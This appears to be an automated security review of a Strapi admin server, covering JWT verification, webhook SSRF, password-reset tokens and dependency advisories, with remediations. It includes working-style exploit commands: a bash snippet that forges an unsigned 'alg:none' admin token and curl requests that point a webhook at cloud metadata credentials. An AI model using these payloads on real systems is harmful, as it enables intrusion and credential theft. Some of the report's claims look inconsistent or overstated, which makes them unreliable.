# Security Review: Strapi admin server

## CRITICAL

### JWT signature algorithm bypass enables authentication bypass for all admin endpoints
- **File:** `services/token.js:45`
- **Evidence:**
  ```
  const payload = jwt.verify(token, secret);
  ```
- **Attack Tree:**
  ```
  strapi.config.get('admin.auth', {}) → services/token.js:10
    └─ getTokenOptions() returns { secret, options } where options has no algorithms key → services/token.js:14
      └─ jwt.verify(token, secret) with no algorithms option → services/token.js:45 — accepts ANY algorithm including 'none'
        └─ strategies/admin.js:20 — decodeJwtToken() accepts forged token with {"alg": "none"} payload
          └─ strategies/admin.js:26-28 — user is looked up by forged payload.id
            └─ strategies/admin.js:36-44 — full admin session with userAbility is established
  ```
- **Taint Trace:**
  ```
  taint_trace: lossy — every returned path is a hypothesis
  index: language=javascript, files=1, defs=1, calls=1, unresolved_callees=0
  Found 1 candidate path(s) from services/token.js:41 to services/token.js:45:
  
  Path 1 (depth 1, resolved 1/1 hops):
    services/token.js:41 [byte 829-838] — fn `decodeJwtToken` — taint root: token
    └─ services/token.js:45 [byte 975-999] — [SINK REACHED] — tainted at sink: jwt.verify(token, secret)
  ```
- **Impact:** Any remote anonymous attacker can forge arbitrary admin JWT tokens by setting `{"alg": "none"}` in the JWT header and supplying an empty signature segment. The attacker gains full admin access — can impersonate any user ID, bypass all admin authentication, and execute privileged operations (install/uninstall plugins, manage users, delete roles, configure webhooks). This affects all admin routes including `/login`, `/register-admin`, `/register`, `/forgot-password`, `/reset-password` where `decodeJwtToken` is called (renew-token at `controllers/authentication.js:57`, admin auth strategy at `strategies/admin.js:20`).
- **Exploit:**
  ```bash
  # Forge admin token for user ID 1 with alg=none
  HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
  PAYLOAD=$(echo -n '{"id":1,"iat":1660000000,"exp":1999999999}' | base64 | tr -d '=' | tr '/+' '_-')
  FORGED_TOKEN="${HEADER}.${PAYLOAD}."
  curl -sk https://strapi-host/admin/login -H "Authorization: Bearer ${FORGED_TOKEN}"
  ```
- **Remediation:** Pass an explicit `algorithms` option to `jwt.verify()`:
  ```javascript
  // services/token.js:45
  const payload = jwt.verify(token, secret, { algorithms: options.algorithms || ['HS256'] });
  ```

## HIGH

### Admin webhook trigger endpoint enables SSRF
- **File:** `controllers/webhooks.js:128`
- **Evidence:**
  ```
  const response = await strapi.webhookRunner.run(webhook, 'trigger-test', {});
  ```
- **Attack Tree:**
  ```
  POST /admin/webhooks/:id/trigger (auth: admin JWT) → controllers/webhooks.js:123
    └─ ctx.params.id → strapi.webhookStore.findWebhook(id) → controllers/webhooks.js:126
      └─ webhook.URL (set via POST /admin/webhooks, validated only by regex) → controllers/webhooks.js:128
        └─ strapi.webhookRunner.run(webhook, ...) — makes HTTP request to attacker-controlled URL
  ```
- **Taint Trace:** not run within budget — structural evidence only
- **Impact:** An authenticated admin user can create a webhook targeting any internal or external host (e.g., `http://169.254.169.254/latest/meta-data/` for cloud metadata, `http://localhost:6379` for Redis). The URL regex at line 7 permits any scheme and host, only checking format validity. This allows the attacker to probe and interact with internal services. Conditional on prior admin foothold.
- **Exploit:**
  ```bash
  # Create webhook pointing to internal service
  curl -sX POST https://strapi-host/admin/webhooks \
    -H "Authorization: Bearer $ADMIN_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"name":"ssrf","url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","headers":{"X-Custom":"1"},"events":["entry.create"]}'
  # Trigger webhook to fetch response
  curl -sX POST https://strapi-host/admin/webhooks/<webhook-id>/trigger \
    -H "Authorization: Bearer $ADMIN_TOKEN"
  ```
- **Remediation:** Add an allowed-host blocklist for internal/reserved IP ranges before executing webhook requests. Validate that `webhook.url` does not resolve to private IP addresses (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.168.0.0/16) and does not use non-HTTP protocols.

## MEDIUM

### Admin webhook creation allows arbitrary URL registration for SSRF (create/update paths)
- **File:** `controllers/webhooks.js:56`
- **Evidence:**
  ```
  const webhook = await strapi.webhookStore.createWebhook(body);
  ```
- **Impact:** Authenticated admin users can register webhook URLs to any host. While the URL is validated by regex at line 7, the regex permits arbitrary protocols and hosts including internal addresses. The actual HTTP request is deferred to `webhookRunner` when events fire. Combined with the trigger endpoint, this provides persistent SSRF capability. Conditional on prior admin foothold.
- **Remediation:** Add hostname allowlisting or internal IP blocklisting in `controllers/webhooks.js` before calling `createWebhook(body)`.

### Password reset token transmitted in URL query string
- **File:** `services/auth.js:66-68`
- **Evidence:**
  ```
  const url = `${getAbsoluteAdminUrl(
    strapi.config
  )}/auth/reset-password?code=${resetPasswordToken}`;
  ```
- **Impact:** The password reset token is transmitted as a URL query parameter (`?code=<token>`), which means it will be stored in browser history, server access logs, and referral headers. An attacker with access to any of these can hijack an admin account by using the leaked token. The token itself is 40 hex chars (`crypto.randomBytes(20)`), which is cryptographically sound, but the transmission channel is insecure.
- **Remediation:** Pass the token via the request body in the password reset form, or embed it as a path segment rather than a query parameter. Alternatively, use a single-use signed link that expires immediately after first use.

## LOW / INFORMATIONAL

### Admin panel static files served without authentication
- **File:** `routes/serve-admin-panel.js:48`
- **Evidence:**
  ```
  config: { auth: false },
  ```
- **Impact:** The admin panel SPA is served publicly. This exposes the application's frontend code, API endpoint structure, and Strapi version to unauthenticated users. This is expected SPA behavior and not exploitable on its own, but it aids reconnaissance.

## Checked and Cleared

- `controllers/admin.js:141` — `execa('npm', ..., ['install', plugin])` — plugin name validated against `/^[A-Za-z][A-Za-z0-9-_]+$/` regex at line 26 before execa call. Not command-injectable.
- `controllers/admin.js:176` — `execa('npm', ..., ['uninstall', plugin])` — same validation at line 169.
- `strategies/admin.js:20` — `decodeJwtToken(token)` calls `jwt.verify(token, secret)` — this is the same JWT vulnerability as the CRITICAL finding above, not independently reportable.
- `controllers/authentication.js:17-50` — login handler uses `passport.authenticate('local')` → koa-passport → local strategy → bcrypt hash comparison. Authentication flow is sound.
- `controllers/authentication.js:52-68` — renewToken decodes JWT and creates new one — same JWT library issue (covered by CRITICAL).
- `controllers/authentication.js:84-97` — register endpoint validates input via Yup schema before calling `user.register()`.
- `controllers/authentication.js:99-133` — registerAdmin checks `hasAdmin` before allowing registration — only one super admin can be created.
- `controllers/authentication.js:135-143` — forgotPassword validates email via Yup, calls `auth.forgotPassword()`.
- `controllers/authentication.js:145-158` — resetPassword validates input via Yup, calls `auth.resetPassword()` which verifies token in DB.
- `services/api-token.js:163-168` — `hash(accessKey)` uses `crypto.createHmac('sha512', salt)` — standard cryptographic hash with HMAC, not exploitable.
- `services/api-token.js:201` — `crypto.randomBytes(128).toString('hex')` for token generation — 1024 bits of entropy, not brute-forceable.
- `services/user.js:14` — `bcrypt.hash(password, 10)` — industry-standard password hashing, cost factor 10 is acceptable.
- `services/role.js:30` — `JSON.parse(JSON.stringify(data))` for deep clone — safe, no prototype pollution risk as data is already JS objects.
- `services/role.js:60` — `_.kebabCase(attributes.name)` for code generation — lodash string transformation, not executed.
- `strategies/api-token.js:28-70` — API token authentication hashes token and looks up by accessKey — bearer extraction and expiry check are correct.
- `strategies/api-token.js:76-127` — API token verify checks type (full-access/read-only/custom) — authorization logic is correct.
- `controllers/webhooks.js:51-61` — createWebhook validates body via Yup schema (URL regex, header types, event whitelist) before storing.
- `controllers/webhooks.js:63-87` — updateWebhook validates body, checks webhook exists before updating.
- `controllers/webhooks.js:89-102` — deleteWebhook checks webhook exists before deletion.
- `routes/serve-admin-panel.js:25-27` — serves `index.html` for SPA fallback with content-type html. Path traversal mitigated by `koa-static` and `path.join` in serveStatic wrapper.

## Dependencies

The `dependency_review` identified **284 vulnerabilities across 4440 dependencies**. Key findings relevant to this admin server review:

- **jsonwebtoken@8.5.1** — **GHSA-qwph-4952-7xr6**: Signature validation bypass via insecure default algorithm in `jwt.verify()`. [fixed in 9.0.0]. Linked finding: `services/token.js:45` (reported above as CRITICAL). This is the core vulnerability exploited by the JWT bypass finding.
- **qs@6.10.1** — **GHSA-hrpp-h998-j3pp**: Prototype pollution [fixed in 6.10.3]. **GHSA-6rw7-vpxm-498p**: arrayLimit bypass [fixed in 6.14.1].
- **koa@2.13.4** — **GHSA-x2rg-q646-7m2v**: XSS at `ctx.redirect()` [fixed in 2.16.1]. **GHSA-7gcc-r8m5-44qm**: Host Header Injection [fixed in 2.16.4]. **GHSA-jgmv-j7ww-jx2x**: Open Redirect via Referrer Header [fixed in 2.16.2].
- **lodash@4.17.21** — **GHSA-f23m-r5pf-42fh**: Prototype pollution via array path bypass in `_.unset`/`_.omit`. **GHSA-r5fr-rjxr-66jc**: Code Injection via `_.template` imports key.
- **execa@1.0.0** — deprecated/old version. Should be upgraded.
- **@koa/cors@3.4.1** — **GHSA-qxrj-hx23-xp82**: Overly permissive origin policy [fixed in 5.0.0].
- **knex@1.0.7** — **GHSA-4jv9-3563-23j3**: Limited SQL injection [fixed in 2.4.0].

Immediate action: upgrade `jsonwebtoken` to >= 9.0.0 (core auth bypass fix). Then address qs, koa, and cors upgrades.

## Remediation Summary

### Immediate (CRITICAL/HIGH)
1. `services/token.js:45` — Add `{ algorithms: ['HS256'] }` to `jwt.verify()` call to prevent algorithm bypass
2. `controllers/webhooks.js:128` — Add internal IP blocklist before calling `webhookRunner.run()`

### Short-term (MEDIUM)
1. `controllers/webhooks.js:56` — Add hostname allowlisting in webhook create/update before storage
2. `services/auth.js:66` — Use path segments instead of query parameters for password reset tokens

### Hardening (LOW)
1. `routes/serve-admin-panel.js:48` — Consider adding rate limiting to admin panel static file serving